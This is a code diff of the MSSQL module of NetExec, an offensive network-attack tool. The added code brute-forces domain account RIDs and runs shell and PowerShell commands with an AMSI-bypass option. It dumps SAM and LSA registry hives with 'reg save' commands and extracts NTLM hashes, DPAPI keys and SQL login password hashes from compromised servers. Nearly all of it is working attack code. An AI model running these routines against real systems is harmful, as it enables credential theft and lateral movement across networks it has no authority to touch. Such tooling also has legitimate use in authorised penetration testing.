@@ -1,19 +1,25 @@
 import os
 import random
-import socket
 import contextlib
+import binascii
+from termcolor import colored
 
-from nxc.config import process_secret
+from nxc.config import process_secret, host_info_colors
 from nxc.connection import connection
 from nxc.connection import requires_admin
+from nxc.helpers.misc import gen_random_string, sanitize_dns
 from nxc.logger import NXCAdapter
 from nxc.helpers.bloodhound import add_user_bh
-from nxc.helpers.ntlm_parser import parse_challenge
+from nxc.helpers.negotiate_parser import parse_challenge, login7_integrated_auth_error_message
 from nxc.helpers.powershell import create_ps_command
+from nxc.helpers.dpapi import DPAPITriage
 from nxc.protocols.mssql.mssqlexec import MSSQLEXEC
+
+from dploot.lib.network.mssql import MSSQLTarget as Target
 
 from impacket import tds, ntlm
 from impacket.krb5.ccache import CCache
+from impacket.dcerpc.v5.dtypes import SID
 from impacket.tds import (
     SQLErrorException,
     TDS_LOGINACK_TOKEN,
@@ -25,7 +31,10 @@ from impacket.tds import (
     TDS_ENVCHANGE_LANGUAGE,
     TDS_ENVCHANGE_CHARSET,
     TDS_ENVCHANGE_PACKETSIZE,
+    TDS_ENCRYPT_REQ,
+    TDS_ENCRYPT_OFF
 )
+from impacket.examples.secretsdump import LocalOperations, LSASecrets, SAMHashes
 
 
 class mssql(connection):
@@ -36,8 +45,16 @@ class mssql(connection):
         self.server_os = None
         self.hash = None
         self.os_arch = None
+        self.lmhash = ""
         self.nthash = ""
-        self.is_mssql = False
+        self.no_ntlm = False
+        self.encryption = None
+        self.edition = ""
+        self.version = ""
+        self.dpapi_system_key = None
+        self.no_da = None
+
+        self._dpapi_triage = None
 
         connection.__init__(self, args, db, host)
 
@@ -53,29 +70,20 @@ class mssql(connection):
 
     def create_conn_obj(self):
         try:
-            self.conn = tds.MSSQL(self.host, self.port)
-            # Default has not timeout option in tds.MSSQL.connect() function, let rewrite it.
-            af, socktype, proto, canonname, sa = socket.getaddrinfo(self.host, self.port, 0, socket.SOCK_STREAM)[0]
-            sock = socket.socket(af, socktype, proto)
-            sock.settimeout(self.args.mssql_timeout)
-            sock.connect(sa)
-            self.conn.socket = sock
-            if not self.is_mssql:
-                self.conn.preLogin()
+            self.conn = tds.MSSQL(self.host, self.port, self.remoteName)
+            self.conn.connect(self.args.mssql_timeout)
         except Exception as e:
             self.logger.debug(f"Error connecting to MSSQL service on host: {self.host}, reason: {e}")
+            with contextlib.suppress(Exception):
+                self.conn.disconnect()
             return False
         else:
-            self.is_mssql = True
             return True
 
     def reconnect_mssql(func):
         def wrapper(self, *args, **kwargs):
             with contextlib.suppress(Exception):
                 self.conn.disconnect()
-            # When using ccache file, we must need to set target host to hostname when creating connection object.
-            if self.kerberos:
-                self.host = self.hostname
             self.create_conn_obj()
             return func(self, *args, **kwargs)
         return wrapper
@@ -90,11 +98,27 @@ class mssql(connection):
         else:
             if is_admin:
                 self.admin_privs = True
-    
+
     @reconnect_mssql
     def enum_host_info(self):
         challenge = None
+
         try:
+            # If the MSSQL Server responds with a TDS_ENCRYPT_REQ or TDS_ENCRYPT_OFF then we need to setup a TLS context
+            resp = self.conn.preLogin()
+            self.encryption = False
+
+            # Parses the MSSQL version
+            self.edition, self.version = (
+                str(self.conn.mssql_version).split("Server ")[1].split(" (")[0],
+                str(self.conn.mssql_version).rsplit("(", 1)[1].rstrip(")")
+            )
+
+            if resp["Encryption"] == TDS_ENCRYPT_REQ or resp["Encryption"] == TDS_ENCRYPT_OFF:
+                # We switch to a TLS context handled by tds.py
+                self.conn.set_tls_context()
+                self.encryption = True
+
             login = tds.TDS_LOGIN()
             login["HostName"] = ""
             login["AppName"] = ""
@@ -103,7 +127,7 @@ class mssql(connection):
             login["ClientPID"] = random.randint(0, 1024)
             login["PacketSize"] = self.conn.packetSize
             login["OptionFlags2"] = tds.TDS_INIT_LANG_FATAL | tds.TDS_ODBC_ON | tds.TDS_INTEGRATED_SECURITY_ON
-            
+
             # NTLMSSP Negotiate
             auth = ntlm.getNTLMSSPType1("", "")
             login["SSPI"] = auth.getData()
@@ -115,40 +139,56 @@ class mssql(connection):
             # Send the NTLMSSP Negotiate or SQL Auth Packet
             self.conn.sendTDS(tds.TDS_LOGIN7, login.getData())
 
+            # According to the specs, if encryption is TDS_ENCRYPT_OFF, we must encrypt the first Login packet
+            if resp["Encryption"] == TDS_ENCRYPT_OFF:
+                self.encryption = False
+                self.conn.tlsSocket = None
+
             tdsx = self.conn.recvTDS()
-            challenge = tdsx["Data"][3:]
-            self.logger.info(f"NTLM challenge: {challenge!s}")
+            login_response = tdsx["Data"]
+            # Impacket historically slices 3 bytes before treating payload as NTLMSSP (LOGIN7 response).
+            challenge = login_response[3:]
+            self.logger.debug(f"LOGIN7 response SSPI slice: {challenge!s}")
         except Exception as e:
             self.logger.info(f"Failed to receive NTLM challenge, reason: {e!s}")
             return False
         else:
-            ntlm_info = parse_challenge(challenge)
-            self.targetDomain = self.domain = ntlm_info["domain"]
-            self.hostname = ntlm_info["hostname"]
-            self.server_os = ntlm_info["os_version"]
-            self.logger.extra["hostname"] = self.hostname
-            self.db.add_host(self.host, self.hostname, self.targetDomain, self.server_os, len(self.mssql_instances),)
+            self.remoteName = self.host
+            if challenge.startswith(b"NTLMSSP\x00"):
+                ntlm_info = parse_challenge(challenge)
+                dns_hostname = ntlm_info["dns_hostname"] or ""
+                hostname = ntlm_info["hostname"] or dns_hostname.split(".", 1)[0] or self.host
+                domain = ntlm_info["domain"] or (dns_hostname.split(".", 1)[1] if "." in dns_hostname else self.host)
+                self.hostname = sanitize_dns(hostname, self.logger)
+                self.targetDomain = self.domain = sanitize_dns(domain, self.logger)
+                self.remoteName = sanitize_dns(dns_hostname, self.logger) if self.kerberos else self.host
+                self.server_os = ntlm_info["os_version"]
+                self.logger.extra["hostname"] = self.hostname
+            else:
+                error_msg = login7_integrated_auth_error_message(login_response, challenge)
+                detail = f": {error_msg}" if error_msg else ""
+                self.logger.debug(f"Server does not support NTLM{detail}")
+                self.no_ntlm = True
+
+        self.db.add_host(self.host, self.hostname, self.domain, self.server_os, self.version, len(self.mssql_instances), self.encryption)
 
         if self.args.domain:
             self.domain = self.args.domain
         if self.args.local_auth:
             self.domain = self.hostname
 
+        if not self.kdcHost and self.domain:
+            result = self.resolver(self.domain)
+            self.kdcHost = result["host"] if result else None
+            self.logger.info(f"Resolved domain: {self.domain} with dns, kdcHost: {self.kdcHost}")
+
     def print_host_info(self):
-        self.logger.display(f"{self.server_os} (name:{self.hostname}) (domain:{self.targetDomain})")
-        return True
+        encryption = colored(f"EncryptionReq:{self.encryption}", host_info_colors[0 if self.encryption else 1], attrs=["bold"])
+        ntlm = colored(f"(NTLM:{not self.no_ntlm})", host_info_colors[2], attrs=["bold"]) if self.no_ntlm else ""
+        self.logger.display(f"{self.server_os} ({self.edition} {self.version}) (name:{self.hostname}) (domain:{self.targetDomain}) ({encryption}) {ntlm}")
 
     @reconnect_mssql
-    def kerberos_login(
-        self,
-        domain,
-        username,
-        password="",
-        ntlm_hash="",
-        aesKey="",
-        kdcHost="",
-        useCache=False,
-    ):
+    def kerberos_login(self, domain, username, password="", ntlm_hash="", aesKey="", kdcHost="", useCache=False):
         self.username = username
         self.password = password
         self.domain = domain
@@ -169,8 +209,7 @@ class mssql(connection):
             username = ccache.credentials[0].header["client"].prettyPrint().decode().split("@")[0]
             self.username = username
 
-        used_ccache = " from ccache" if useCache else f":{process_secret(kerb_pass)}"
-
+        used_ccache = " from ccache" if useCache else f"{process_secret(kerb_pass)}"
         try:
             res = self.conn.kerberosLogin(
                 None,
@@ -196,7 +235,7 @@ class mssql(connection):
             return False
         except Exception:
             error_msg = self.handle_mssql_reply()
-            self.logger.fail("{}\\{}:{} {}".format(self.domain, self.username, kerb_pass, error_msg if error_msg else ""))
+            self.logger.fail(f"{self.domain}\\{self.username}:{used_ccache} {error_msg if error_msg else ''}")
             return False
 
     @reconnect_mssql
@@ -204,24 +243,22 @@ class mssql(connection):
         self.password = password
         self.username = username
         self.domain = domain
-        
+
         try:
-            res = self.conn.login(
-                None,
-                self.username,
-                self.password,
-                self.domain,
-                None,
-                not self.args.local_auth,
-            )
+            res = self.conn.login(None, self.username, self.password, self.domain, None, not self.args.local_auth)
             if res is not True:
                 raise
             self.check_if_admin()
-            out = f"{self.domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}"
-            self.logger.success(out)
+            self.logger.success(f"{self.domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}")
+            self.db.add_credential("plaintext", self.domain, self.username, self.password)
+            user_id = self.db.get_credential("plaintext", domain, self.username, self.password)
+            host_id = self.db.get_hosts(self.host)[0].id
+            self.db.add_loggedin_relation(user_id, host_id)
+
             if not self.args.local_auth and self.username != "":
                 add_user_bh(self.username, self.domain, self.logger, self.config)
             if self.admin_privs:
+                self.db.add_admin_user("plaintext", domain, self.username, self.password, self.host, user_id=user_id)
                 add_user_bh(f"{self.hostname}$", self.domain, self.logger, self.config)
             return True
         except BrokenPipeError:
@@ -229,7 +266,7 @@ class mssql(connection):
             return False
         except Exception:
             error_msg = self.handle_mssql_reply()
-            self.logger.fail("{}\\{}:{} {}".format(self.domain, self.username, process_secret(self.password), error_msg if error_msg else ""))
+            self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.password)} {error_msg if error_msg else ''}")
             return False
 
     @reconnect_mssql
@@ -238,29 +275,27 @@ class mssql(connection):
         self.domain = domain
         self.lmhash = ""
         self.nthash = ""
-        
+
         if ntlm_hash.find(":") != -1:
             self.lmhash, self.nthash = ntlm_hash.split(":")
         else:
             self.nthash = ntlm_hash
 
         try:
-            res = self.conn.login(
-                None,
-                self.username,
-                "",
-                self.domain,
-                f"{self.lmhash}:{self.nthash}",
-                not self.args.local_auth,
-            )
+            res = self.conn.login(None, self.username, "", self.domain, f"{self.lmhash}:{self.nthash}", not self.args.local_auth)
             if res is not True:
                 raise
             self.check_if_admin()
-            out = f"{self.domain}\\{self.username}:{process_secret(self.nthash)} {self.mark_pwned()}"
-            self.logger.success(out)
+            self.logger.success(f"{self.domain}\\{self.username}:{process_secret(self.nthash)} {self.mark_pwned()}")
+            self.db.add_credential("hash", self.domain, self.username, self.nthash)
+            user_id = self.db.get_credential("hash", domain, self.username, self.nthash)
+            host_id = self.db.get_hosts(self.host)[0].id
+            self.db.add_loggedin_relation(user_id, host_id)
+
             if not self.args.local_auth and self.username != "":
                 add_user_bh(self.username, self.domain, self.logger, self.config)
             if self.admin_privs:
+                self.db.add_admin_user("hash", domain, self.username, self.nthash, self.host, user_id=user_id)
                 add_user_bh(f"{self.hostname}$", self.domain, self.logger, self.config)
             return True
         except BrokenPipeError:
@@ -268,28 +303,29 @@ class mssql(connection):
             return False
         except Exception:
             error_msg = self.handle_mssql_reply()
-            self.logger.fail("{}\\{}:{} {}".format(self.domain, self.username, process_secret(self.nthash), error_msg if error_msg else ""))
+            self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.nthash)} {error_msg if error_msg else ''}")
             return False
 
-    def mssql_query(self):
+    def query(self):
         if self.conn.lastError:
             # Invalid connection
+            self.logger.debug(f"Cannot execute query due to invalid connection: {self.conn.lastError}")
             return None
-        query = self.args.mssql_query
-        self.logger.info(f"Query to run:\n{query}")
+        self.logger.info(f"Query to run: {self.args.query}")
         try:
-            raw_output = self.conn.sql_query(query)
-            self.logger.info("Executed MSSQL query")
+            raw_output = self.conn.sql_query(self.args.query)
             self.logger.debug(f"Raw output: {raw_output}")
-            for data in raw_output:
-                if isinstance(data, dict):
+            if self.conn.lastError:
+                self.logger.debug(f"Error during query execution: {self.conn.lastError}")
+                self.logger.fail(self.conn.lastError)
+            else:
+                for data in raw_output:
+                    self.logger.highlight("--------------------")
                     for key, value in data.items():
                         if key:
                             self.logger.highlight(f"{key}:{value}")
                         else:
                             self.logger.highlight(f"{value}")
-                else:
-                    self.logger.fail("Unexpected output")
         except Exception as e:
             self.logger.exception(f"Failed to excuted MSSQL query, reason: {e}")
             return None
@@ -297,42 +333,57 @@ class mssql(connection):
 
     @requires_admin
     def execute(self, payload=None, get_output=False):
-        if not payload and self.args.execute:
-            payload = self.args.execute
+        payload = self.args.execute if not payload and self.args.execute else payload
+        if not payload:
+            self.logger.error("No command to execute specified!")
+            return None
 
-        if not self.args.no_output:
-            get_output = True
+        get_output = True if not self.args.no_output else get_output
+        self.logger.debug(f"{get_output=}")
 
-        self.logger.info(f"Command to execute: {payload}")
+        output = ""
         try:
             exec_method = MSSQLEXEC(self.conn, self.logger)
-            raw_output = exec_method.execute(payload, get_output)
+            output = exec_method.execute(payload)
+            self.logger.debug(f"Output: {output}")
         except Exception as e:
             self.logger.fail(f"Execute command failed, error: {e!s}")
             return False
         else:
-            self.logger.success("Executed command via mssqlexec")
-            if raw_output:
-                for line in raw_output:
-                    self.logger.highlight(line)
-            return raw_output
+            if self.conn.lastError:
+                self.logger.fail(f"Error during command execution: {self.conn.lastError}")
+            else:
+                self.logger.success("Executed command via mssqlexec")
+                for line in output.splitlines():
+                    self.logger.highlight(line.strip())
+        return output
 
     @requires_admin
-    def ps_execute(
-        self,
-        payload=None,
-        get_output=False,
-        force_ps32=False,
-        dont_obfs=False,
-    ):
-        if not payload and self.args.ps_execute:
-            payload = self.args.ps_execute
-            if not self.args.no_output:
-                get_output = True
+    def ps_execute(self, payload=None, get_output=False, methods=None, force_ps32=False, obfs=False, encode=False):
+        payload = self.args.ps_execute if not payload and self.args.ps_execute else payload
+        if not payload:
+            self.logger.error("No command to execute specified!")
+            return None
 
-        # We're disabling PS obfuscation by default as it breaks the MSSQLEXEC execution method
-        ps_command = create_ps_command(payload, force_ps32=force_ps32, dont_obfs=dont_obfs)
-        return self.execute(ps_command, get_output)
+        response = []
+        obfs = obfs if obfs else self.args.obfs
+        encode = encode if encode else not self.args.no_encode
+        force_ps32 = force_ps32 if force_ps32 else self.args.force_ps32
+        get_output = True if not self.args.no_output else get_output
+
+        self.logger.debug(f"Starting PS execute: {payload=} {get_output=} {methods=} {force_ps32=} {obfs=} {encode=}")
+        amsi_bypass = self.args.amsi_bypass[0] if self.args.amsi_bypass else None
+        self.logger.debug(f"AMSI Bypass: {amsi_bypass}")
+
+        if os.path.isfile(payload):
+            self.logger.debug(f"File payload set: {payload}")
+            with open(payload) as commands:
+                response = [self.execute(create_ps_command(c.strip(), force_ps32=force_ps32, obfs=obfs, custom_amsi=amsi_bypass, encode=encode), get_output) for c in commands]
+        else:
+            response = [self.execute(create_ps_command(payload, force_ps32=force_ps32, obfs=obfs, custom_amsi=amsi_bypass, encode=encode), get_output)]
+
+        self.logger.debug(f"ps_execute response: {response}")
+        return response
 
     @requires_admin
     def put_file(self):
@@ -351,7 +402,7 @@ class mssql(connection):
                 self.logger.fail(f"Error during upload : {e}")
 
     @requires_admin
-    def get_file(self): 
+    def get_file(self):
         remote_path = self.args.get_file[0]
         download_path = self.args.get_file[1]
         self.logger.display(f'Copying "{remote_path}" to "{download_path}"')
@@ -400,3 +451,304 @@ class mssql(connection):
                     else:
                         _type = f"{key['Type']:d}"
                     return f"(ENVCHANGE({_type}): Old Value: {record['OldValue'].decode('utf-16le')}, New Value: {record['NewValue'].decode('utf-16le')})"
+
+    def rid_brute(self, max_rid=None):
+        entries = []
+        if self.conn.lastError:
+            self.logger.fail(f"Cannot perform RID bruteforce due to invalid connection: {self.conn.lastError}")
+            return entries
+        if not max_rid:
+            max_rid = int(self.args.rid_brute)
+
+        try:
+            # Query domain
+            domain = self.conn.sql_query("SELECT DEFAULT_DOMAIN()")[0][""]
+
+            # Query known group to determine raw SID & convert to canon
+            raw_domain_sid = self.conn.sql_query(f"SELECT SUSER_SID('{domain}\\Domain Admins')")[0][""]
+            domain_sid = SID(bytes.fromhex(raw_domain_sid)).formatCanonical()[:-4]
+        except Exception as e:
+            self.logger.fail(f"Error parsing SID. Not domain joined?: {e}")
+            return entries
+
+        so_far = 0
+        simultaneous = 1000
+        for _j in range(max_rid // simultaneous + 1):
+            sids_to_check = (max_rid - so_far) % simultaneous if (max_rid - so_far) // simultaneous == 0 else simultaneous
+            if sids_to_check == 0:
+                break
+
+            # Batch query multiple sids at a time
+            sid_queries = [f"SELECT SUSER_SNAME(SID_BINARY(N'{domain_sid}-{i:d}'))" for i in range(so_far, so_far + sids_to_check)]
+            raw_output = self.conn.sql_query(";".join(sid_queries))
+
+            for n, item in enumerate(raw_output):
+                username = item[""]
+                if username is None:
+                    continue
+                rid = so_far + n
+                self.logger.highlight(f"{rid}: {username}")
+                entries.append(
+                    {
+                        "rid": rid,
+                        "domain": domain,
+                        "username": username.split("\\")[1],
+                    }
+                )
+
+            so_far += simultaneous
+        return entries
+
+    def _qname(self, ident: str) -> str:
+        if ident is None:
+            return "[]"
+        return "[" + str(ident).replace("]", "]]") + "]"
+
+    def list_databases(self):
+        query = """
+        SELECT d.name AS DatabaseName, suser_sname(d.owner_sid) AS Owner
+        FROM sys.databases d
+        ORDER BY d.name;
+        """
+        rows = self.conn.sql_query(query)
+        if self.conn.lastError:
+            self.logger.fail(f"Error running the SQL query: {self.conn.lastError}")
+        if not rows:
+            self.logger.display("No databases returned")
+            return
+
+        self.logger.display("Enumerated databases")
+        self.logger.highlight(f"{'Database Name':<30} {'Owner':<25}")
+        self.logger.highlight(f"{'-' * 30} {'-' * 25}")
+        for row in rows:
+            database_name = row.get("DatabaseName", "")
+            owner = row.get("Owner", "")
+            self.logger.highlight(f"{database_name:<30} {owner:<25}")
+        self.logger.highlight(f"Total: {len(rows)} database(s)")
+
+    def database(self):
+        # nxc --database (no value) -> list
+        if self.args.database is True:
+            self.list_databases()
+            return
+
+        # nxc --database <name> -> tables
+        if isinstance(self.args.database, str):
+            safe = self.args.database.replace("'", "''")
+            exists = self.conn.sql_query(f"SELECT 1 FROM sys.databases WHERE name = N'{safe}';")
+            if self.conn.lastError:
+                self.logger.fail(f"Error running the SQL query: {self.conn.lastError}")
+            if not exists:
+                self.logger.fail(f"Database [{self.args.database}] does not exist on the server.")
+                return
+
+            query = f"""
+                SELECT t.name AS TableName, t.modify_date
+                FROM {self._qname(self.args.database)}.sys.tables t
+                ORDER BY t.name;
+            """
+            rows = self.conn.sql_query(query)
+
+            if self.conn.lastError:
+                self.logger.fail(f"Error running the SQL query: {self.conn.lastError}")
+
+            if not rows:
+                self.logger.display(f"Database [{self.args.database}] has no user tables.")
+                return
+
+            self.logger.display(f"Tables in database: {self.args.database}")
+            self.logger.highlight(f"{'Table Name':<50} {'Last Modified':<25}")
+            self.logger.highlight(f"{'-' * 50} {'-' * 25}")
+            for row in rows:
+                modify_date = row.get("modify_date", "")
+                if modify_date and hasattr(modify_date, "strftime"):
+                    modify_date = modify_date.strftime("%Y-%m-%d %H:%M:%S")
+                self.logger.highlight(f"{row.get('TableName', ''):<50} {modify_date!s:<25}")
+            self.logger.highlight(f"Total: {len(rows)} table(s)")
+            return
+
+    @requires_admin
+    def sam(self):
+        sam_storename = gen_random_string(6)
+        system_storename = gen_random_string(6)
+        dump_command = f"reg save HKLM\\SAM C:\\windows\\temp\\{sam_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
+        # del must list C:\windows\temp, which the SQL service account may not be allowed to do; Remove-Item -LiteralPath does not need to
+        clean_command = f"powershell -NoProfile -Command Remove-Item -LiteralPath C:\\windows\\temp\\{sam_storename},C:\\windows\\temp\\{system_storename} -Force -ErrorAction SilentlyContinue"
+        get_owner_command = f"icacls C:\\windows\\temp\\{sam_storename} /grant {self.username}:F && icacls C:\\windows\\temp\\{system_storename} /grant {self.username}:F"
+        output_filename = self.output_file_template.format(output_folder="sam")
+        try:
+            exec_method = MSSQLEXEC(self.conn, self.logger)
+            exec_method.execute(dump_command)
+            exec_method.execute(get_owner_command)
+            exec_method.get_file(f"C:\\windows\\temp\\{sam_storename}", f"{output_filename}.sam")
+            exec_method.get_file(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
+            exec_method.execute(clean_command)
+        except Exception as e:
+            self.logger.fail(f"Failed to dump SAM database, error: {e!s}")
+            self.logger.debug(f"Error dumping SAM: {e}", exc_info=True)
+        else:
+            if not (os.path.exists(f"{output_filename}.sam") and os.path.getsize(f"{output_filename}.sam") > 0) \
+                or not (os.path.exists(f"{output_filename}.system") and os.path.getsize(f"{output_filename}.system") > 0):
+                self.logger.fail("SAM or SYSTEM hive could not be dumped, privs may not be sufficient.")
+                return
+            self.logger.display("Dumping SAM hashes")
+            local_operations = LocalOperations(f"{output_filename}.system")
+            boot_key = local_operations.getBootKey()
+            SAM = SAMHashes(
+                f"{output_filename}.sam",
+                boot_key,
+                isRemote=None,
+                perSecretCallback=lambda secret: self.logger.highlight(secret),
+            )
+            SAM.dump()
+            SAM.export(output_filename)
+
+    @requires_admin
+    def lsa(self, quiet=False):
+        security_storename = gen_random_string(6)
+        system_storename = gen_random_string(6)
+        dump_command = f"reg save HKLM\\SECURITY C:\\windows\\temp\\{security_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
+        # del must list C:\windows\temp, which the SQL service account may not be allowed to do; Remove-Item -LiteralPath does not need to
+        clean_command = f"powershell -NoProfile -Command Remove-Item -LiteralPath C:\\windows\\temp\\{security_storename},C:\\windows\\temp\\{system_storename} -Force -ErrorAction SilentlyContinue"
+        get_owner_command = f"icacls C:\\windows\\temp\\{security_storename} /grant {self.username}:F && icacls C:\\windows\\temp\\{system_storename} /grant {self.username}:F"
+        output_filename = self.output_file_template.format(output_folder="lsa")
+        try:
+            exec_method = MSSQLEXEC(self.conn, self.logger)
+            exec_method.execute(dump_command)
+            exec_method.execute(get_owner_command)
+            exec_method.get_file(f"C:\\windows\\temp\\{security_storename}", f"{output_filename}.security")
+            exec_method.get_file(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
+            exec_method.execute(clean_command)
+        except Exception as e:
+            self.logger.fail(f"Failed to dump LSA secrets, error: {e!s}")
+            self.logger.debug(f"Error dumping LSA: {e}", exc_info=True)
+        else:
+            if not (os.path.exists(f"{output_filename}.security") and os.path.getsize(f"{output_filename}.security") > 0) \
+                or not (os.path.exists(f"{output_filename}.system") and os.path.getsize(f"{output_filename}.system") > 0):
+                self.logger.fail("SECURITY or SYSTEM hive could not be dumped, privs may not be sufficient.")
+                return
+            if not quiet:
+                self.logger.display("Dumping LSA secrets")
+            local_operations = LocalOperations(f"{output_filename}.system")
+            boot_key = local_operations.getBootKey()
+
+            def lsa_secret_callback(_, secret):
+                if "dpapi_machinekey" not in secret:
+                    if not quiet:
+                        self.logger.highlight(secret)
+                else:
+                    correl_table = {"dpapi_machinekey": "MachineKey", "dpapi_userkey": "UserKey"}
+                    self.dpapi_system_key = {correl_table[k]: binascii.unhexlify(v[2:]) for k, v in (elem.split(":") for elem in secret.splitlines())}
+                    if not quiet:
+                        self.logger.highlight(f"dpapi_machinekey:{self.dpapi_system_key['MachineKey'].hex()}")
+                        self.logger.highlight(f"dpapi_userkey:{self.dpapi_system_key['UserKey'].hex()}")
+            LSA = LSASecrets(
+                f"{output_filename}.security",
+                boot_key,
+                None,
+                isRemote=None,
+                perSecretCallback=lsa_secret_callback,
+            )
+            LSA.dumpCachedHashes()
+            LSA.dumpSecrets()
+
+    @requires_admin
+    def dpapi(self):
+        self.dpapi_triage.triage_dpapi()
+
+    @property
+    def dpapi_triage(self) -> DPAPITriage:
+        if self._dpapi_triage is not None:
+            return self._dpapi_triage
+
+        target = Target.create(
+            domain=self.domain,
+            username=self.username,
+            password=self.password,
+            address=self.remoteName,
+            port=self.port,
+            hashes=f":{self.nthash}",
+            do_kerberos=self.kerberos,
+            kdcHost=self.kdcHost,
+            use_kcache=self.use_kcache,
+            aesKey=self.aesKey,
+            db_auth=self.args.local_auth,
+        )
+
+        self._dpapi_triage = DPAPITriage(self, target)
+        return self._dpapi_triage
+
+    @requires_admin
+    def db_hash(self):
+        self.logger.display("Dumping local database users' hashes")
+        query = """
+        SELECT
+            sp.name,
+            CASE
+                WHEN SUBSTRING(sl.password_hash, 1, 2) = 0x0200 THEN 'SHA-512'
+                WHEN SUBSTRING(sl.password_hash, 1, 2) = 0x0300 THEN 'PBKDF2'
+                WHEN SUBSTRING(sl.password_hash, 1, 2) = 0x0100 THEN 'SHA-1'
+                ELSE 'Unknown'
+            END AS hash_type,
+            sl.password_hash
+        FROM sys.server_principals sp
+        INNER JOIN sys.sql_logins sl
+            ON sp.principal_id = sl.principal_id
+        WHERE sp.type = 'S'           -- uniquement les logins SQL
+        AND sp.name NOT LIKE '##%'
+        ORDER BY sp.name;
+        """
+        rows = self.conn.sql_query(query)
+        if self.conn.lastError:
+            self.logger.fail(f"Error running the SQL query: {self.conn.lastError}")
+            return
+        if not rows:
+            self.logger.fail("No logins returned")
+            return
+        else:
+            self.logger.display("Enumerated logins")
+            self.logger.highlight(f"{'Login Name':<15} {'Hash type':<10} {'Hash'}")
+            self.logger.highlight(f"{'----------':<15} {'----------':<10} {'--------------':}")
+            for row in rows:
+                name = row.get("name")
+                hash_type = row.get("hash_type")
+                password_hash = row.get("password_hash")
+                if password_hash != "NULL":
+                    self.logger.highlight(f"{name:<15} {hash_type:<10} {password_hash:<140}")
+
+    def list_backups(self):
+        self.logger.info("Dumping database backups")
+        query = """
+        SELECT
+            bs.database_name,
+            bs.server_name,
+            bmf.physical_device_name AS backup_file_path,
+            CASE
+                WHEN bs.encryptor_type IS NULL THEN 'Unencrypted'
+                ELSE 'Encrypted'
+            END AS backup_encryption_status,
+            bs.encryptor_type,
+            bs.key_algorithm
+        FROM msdb.dbo.backupset AS bs
+        INNER JOIN msdb.dbo.backupmediafamily AS bmf
+            ON bs.media_set_id = bmf.media_set_id
+        INNER JOIN sys.databases AS d
+            ON bs.database_name = d.name
+        ORDER BY bs.backup_finish_date DESC;
+        """
+        rows = self.conn.sql_query(query)
+        if self.conn.lastError:
+            self.logger.fail(f"Error running the SQL query: {self.conn.lastError}")
+            return
+        if not rows:
+            self.logger.fail("No backups returned")
+            return
+        else:
+            self.logger.display("Enumerated backups")
+            self.logger.highlight(f"{'Backup Name':<20} {'Encryption':<15} {'Backup Path'}")
+            self.logger.highlight(f"{'-----------':<20} {'----------':<15} {'-----------'}")
+            for row in rows:
+                database_name = row.get("database_name").strip()
+                is_encrypted = row.get("backup_encryption_status").strip()
+                backup_file_path = row.get("backup_file_path").strip()
+                self.logger.highlight(f"{database_name:<20} {is_encrypted:<15s} {backup_file_path}")
